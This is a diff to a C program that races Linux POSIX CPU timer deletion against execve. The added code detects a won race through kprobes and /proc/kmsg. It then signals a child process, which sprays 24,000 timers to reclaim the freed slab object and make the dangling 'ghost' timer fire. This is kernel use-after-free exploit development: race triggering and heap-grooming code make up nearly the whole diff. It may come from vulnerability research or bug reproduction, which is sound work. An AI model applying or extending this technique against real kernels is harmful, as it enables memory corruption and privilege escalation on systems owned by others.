@@ -61,14 +61,14 @@
 
 #define MARKER_FD 3
 #define SPRAY_TIMERS 64
-#define LEADER_LOAD_TIMERS 48
+#define LEADER_LOAD_TIMERS 192
 #define RECLAIM_PROBES 8
 #define CPU2_PROBES 600
 #define RECLAIM_SIG SIGRTMIN
 #define CHURN_TIMERS 16
 #define CASCADE_TIMERS 8
 #define DHAMMER_TIMERS 512
-#define N_PROBES 6
+#define N_PROBES 8
 
 /* Shared parent/child handshake, inherited across fork(). */
 struct race_shm {
@@ -76,6 +76,7 @@ struct race_shm {
 	uint32_t go;		/* child's exec thread is entering execve */
 	uint32_t stage_b;	/* parent wants the churning phase2 */
 	uint32_t near;		/* arm a short (near) expiry this trial */
+	uint32_t flood;		/* parent saw del_shnull rise: this trial won */
 };
 
 static struct race_shm *shm;
@@ -195,9 +196,12 @@ static const char *kprobe_defs[N_PROBES] = {
 	"p:xchng exchange_tids",
 	"p:exitsig __exit_signal",
 	"r:sh_ret __lock_task_sighand ret=$retval",
+	"p:ctfire cpu_timer_fire",
+	"p:ctdeq posix_cpu_timer_del+0x94",
 };
 static const char *kprobe_names[N_PROBES] = {
 	"del_pnull", "del_shnull", "set_esrch", "xchng", "exitsig", "sh_ret",
+	"ctfire", "ctdeq",
 };
 static uint64_t kprobe_hits[N_PROBES];
 static volatile int kprobe_stop;
@@ -259,6 +263,32 @@ static void *kprobe_reader(void *arg)
 		(void)carry_len;
 	}
 	close(fd);
+	return NULL;
+}
+
+static uint64_t g_kmsg_warns;
+
+static void *kmsg_reader(void *arg)
+{
+	int fd = open("/proc/kmsg", O_RDONLY);
+
+	(void)arg;
+	if (fd < 0) {
+		emit("KMSG_OPEN_FAIL errno=%d\n", errno);
+		return NULL;
+	}
+	for (;;) {
+		char buf[4096];
+		ssize_t n = read(fd, buf, sizeof(buf) - 1);
+
+		if (n <= 0)
+			break;
+		buf[n] = '\0';
+		if (strstr(buf, "posix_cpu_timer_del") &&
+		    strstr(buf, "WARNING"))
+			__atomic_fetch_add(&g_kmsg_warns, 1,
+					   __ATOMIC_RELAXED);
+	}
 	return NULL;
 }
 
@@ -460,10 +490,70 @@ static void phase2(unsigned long iter, unsigned mode, uint64_t t_go)
 	sigaddset(&set44, RECLAIM_SIG);
 	sigprocmask(SIG_BLOCK, &set44, NULL);
 	uint64_t start = cntvct();
+	int flood = 0;
 
-	while ((cntvct() - start) / (freq / 1000) < 80)
+	fcntl(4, F_SETFL, O_NONBLOCK);
+	while ((cntvct() - start) / (freq / 1000) < 80) {
+		long trig;
+
+		while (read(4, &trig, sizeof(trig)) ==
+		       (ssize_t)sizeof(trig)) {
+			if (trig == (long)iter)
+				flood = 1;
+		}
+		if (flood)
+			break;
 		asm volatile("yield");
-	emit("QUIET_DONE iter=%ld\n", (long)iter);
+	}
+	emit("QUIET_DONE iter=%ld flood=%d\n", (long)iter, flood);
+	if (flood) {
+		/*
+		 * The mass same-trial free empties the ghost's slab page and
+		 * SLUB discards it to the buddy allocator, so shallow or
+		 * deep freelist pops never reach the ghost. Refill the cache
+		 * hard: enough timer_create calls to grow the cache back
+		 * through the recycled page, consuming every free object on
+		 * it including the ghost.
+		 */
+		static const int FLOOD_TIMERS = 24000;
+		timer_t ft[FLOOD_TIMERS];
+
+		for (int i = 0; i < FLOOD_TIMERS; i++)
+			ft[i] = (timer_t)-1;
+		memset(&its, 0, sizeof(its));
+		its.it_value.tv_nsec = 1;
+		for (int i = 0; i < FLOOD_TIMERS; i++) {
+			if (timer_create(CLOCK_MONOTONIC, &sev, &ft[i]))
+				anomalies++;
+			else
+				armed++;
+		}
+		/* Burn CPU so ticks run the queue walk for the aliased
+		 * ghost, then free the flood timers again. */
+		start = cntvct();
+		while ((cntvct() - start) / (freq / 1000) < 60)
+			asm volatile("yield");
+		ts.tv_sec = 0;
+		ts.tv_nsec = 20000000;
+		while (sigcount < armed + 4) {
+			siginfo_t si;
+
+			if (sigtimedwait(&set44, &si, &ts) < 0)
+				break;
+			sigcount++;
+			if (sigcount == armed + 1)
+				emit("GHOST_FIRE iter=%ld armed=%d "
+				     "extra=1\n", (long)iter, armed);
+		}
+		for (int i = 0; i < FLOOD_TIMERS; i++)
+			if (ft[i] != (timer_t)-1)
+				timer_delete(ft[i]);
+		emit("PHASE2 iter=%ld mode=%u anomalies=%d armed=%d "
+		     "sigcount=%d overruns=%d flood=1\n",
+		     (long)iter, mode, anomalies, armed, sigcount,
+		     overruns);
+		_exit(0);
+	}
 
 	memset(&its, 0, sizeof(its));
 	its.it_value.tv_nsec = 1;	/* absolute past: expires = 1 */
@@ -553,6 +643,29 @@ struct klog_watch {
 	int oops;
 };
 
+static int g_warn_seen;
+
+static const char *klog_message(const char *line)
+{
+	/* klogctl includes priority and optional timestamp/caller prefixes. */
+	if (*line == '<') {
+		const char *end = strchr(line, '>');
+
+		if (end)
+			line = end + 1;
+	}
+	line += strspn(line, " \t");
+	while (*line == '[') {
+		const char *end = strchr(line, ']');
+
+		if (!end)
+			break;
+		line = end + 1;
+		line += strspn(line, " \t");
+	}
+	return line;
+}
+
 static void klog_scan(struct klog_watch *watch)
 {
 	static char buf[16384];
@@ -570,12 +683,16 @@ static void klog_scan(struct klog_watch *watch)
 		next = strchr(line, '\n');
 		if (next)
 			*next++ = '\0';
-		if (!strncmp(line, "WARNING:", 8) &&
-		    strstr(line, "posix_cpu_timer_del"))
+		const char *message = klog_message(line);
+
+		if (!strncmp(message, "WARNING:", 8) &&
+		    strstr(message, "posix_cpu_timer_del")) {
 			warns++;
-		if (!strncmp(line, "Unable to handle kernel", 23) ||
-		    !strncmp(line, "Internal error:", 15) ||
-		    !strncmp(line, "BUG:", 4))
+			g_warn_seen = 1;
+		}
+		if (!strncmp(message, "Unable to handle kernel", 23) ||
+		    !strncmp(message, "Internal error:", 15) ||
+		    !strncmp(message, "BUG:", 4))
 			oops++;
 	}
 	if (warns > watch->warns) {
@@ -594,6 +711,8 @@ static uint64_t g_exec_us_min, g_exec_us_max, g_exec_us_total;
 static uint64_t g_exec_samples;
 static uint64_t g_hammer_hits, g_hammer_calls;
 static uint64_t g_last_hit_ns = 200000; /* default 200us window offset */
+static uint64_t g_last_shnull;
+static int g_trig_pipe[2] = { -1, -1 };
 static int g_check_target = 1;
 
 static void on_alarm(int sig)
@@ -627,6 +746,9 @@ static int parent_trial(long iter, uint64_t delay_ns, int near, int stage_b,
 	pid_t pid = fork();
 
 	if (pid == 0) {
+		dup2(g_trig_pipe[0], 4);
+		close(g_trig_pipe[0]);
+		close(g_trig_pipe[1]);
 		racing_child(iter);
 		_exit(1);
 	}
@@ -827,12 +949,41 @@ static int parent_trial(long iter, uint64_t delay_ns, int near, int stage_b,
 		timer_delete(g_timer);
 	}
 
+	/* Win detector: the del_shnull kprobe counter rises exactly when
+	 * posix_cpu_timer_del takes the NULL-sighand path (WARN or the
+	 * silent once-per-boot repeat). The reader thread counts events
+	 * with up to ~20ms latency, so keep re-checking while the child's
+	 * quiet spin is still running and flag it for the refill flood. */
+	atomic_store_explicit(&shm->flood, 0, memory_order_release);
 	g_alarm_fired = 0;
 	alarm(3);
 	int st;
 
+	for (int poll_ms = 0; poll_ms < 70; poll_ms++) {
+		uint64_t shnull = __atomic_load_n(&g_kmsg_warns,
+						  __ATOMIC_RELAXED) +
+				   __atomic_load_n(&kprobe_hits[1],
+						   __ATOMIC_RELAXED);
+
+		if (shnull != g_last_shnull) {
+			emit("WIN_DETECT iter=%ld shnull=%llu\n", iter,
+			     (unsigned long long)shnull);
+			long trig = (long)iter;
+
+			if (write(g_trig_pipe[1], &trig, sizeof(trig)) < 0) {
+			}
+			g_last_shnull = shnull;
+			break;
+		}
+		if (waitpid(pid, &st, WNOHANG) == pid)
+			goto reaped;
+		struct timespec ts = { 0, 2000000 };
+
+		nanosleep(&ts, NULL);
+	}
 	while (waitpid(pid, &st, 0) < 0 && errno == EINTR)
 		;
+reaped:
 	alarm(0);
 	g_child_pid = -1;
 	if (g_alarm_fired)
@@ -960,6 +1111,10 @@ int main(int argc, char **argv)
 	signal(SIGALRM, on_alarm);
 	g_child_pid = -1;
 
+	if (pipe(g_trig_pipe)) {
+		emit("PIPE_FAIL errno=%d\n", errno);
+		return 2;
+	}
 	shm = mmap(NULL, sizeof(*shm), PROT_READ | PROT_WRITE,
 		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	if (shm == MAP_FAILED) {
@@ -978,15 +1133,19 @@ int main(int argc, char **argv)
 		pin(2);
 		emit("RACE_INIT pid=1 self=%s argc=%d cross_process=1\n",
 		     g_self, argc);
-		int rc = 0;
 
 		pthread_t kth;
 
+		mkdir("/proc", 0755);
+		if (mount("proc", "/proc", "proc", 0, NULL) != 0)
+			emit("PROC_MOUNT_FAIL errno=%d\n", errno);
+		else
+			pthread_create(&kth, NULL, kmsg_reader, NULL);
 		if (kprobes_setup() == 0) {
 			pthread_create(&kth, NULL, kprobe_reader, NULL);
 			emit("KPROBE_ONLINE\n");
 		}
-		rc |= run_sweep("hammer", 0, 4000000, 20, MODE_HAMMER);
+		run_sweep("hammer", 0, 4000000, 20, MODE_HAMMER);
 		kprobes_report("after_hammer");
 		/* The kretprobe on every lock_task_sighand call starves the
 		 * RCU grace-period kthread under delete-hammer load; the
@@ -994,11 +1153,17 @@ int main(int argc, char **argv)
 		 * overhead widens de_thread()'s critical section, which the
 		 * hammer-phase data shows multiplies the window rate. */
 		kprobe_set_enabled("sh_ret", 0);
-		rc |= run_sweep("dhammer", 0, 4000000, 320, MODE_DHAMMER);
+		/* Keep the per-delete probes off during the delete flood:
+		 * their volume wraps the ring buffer and the reader falls
+		 * seconds behind, swallowing the rare events the win
+		 * detector and fire probe depend on. */
+		kprobe_set_enabled("ctdeq", 0);
+		kprobe_set_enabled("del_pnull", 0);
+		run_sweep("dhammer", 0, 4000000, 320, MODE_DHAMMER);
 		kprobes_report("after_dhammer");
 		kprobe_stop = 1;
 		dump_klog_tail();
-		emit("RACE_RESULT warn_seen=%d\n", rc == 0);
+		emit("RACE_RESULT warn_seen=%d\n", g_warn_seen);
 		sync();
 		reboot(RB_POWER_OFF);
 		_exit(0);
@@ -1010,6 +1175,6 @@ int main(int argc, char **argv)
 	int rc = run_sweep("shell", 0, 200000, 120, 0);
 
 	dump_klog_tail();
-	emit("RACE_RESULT warn_seen=%d\n", rc == 0);
+	emit("RACE_RESULT warn_seen=%d\n", g_warn_seen);
 	return rc;
 }
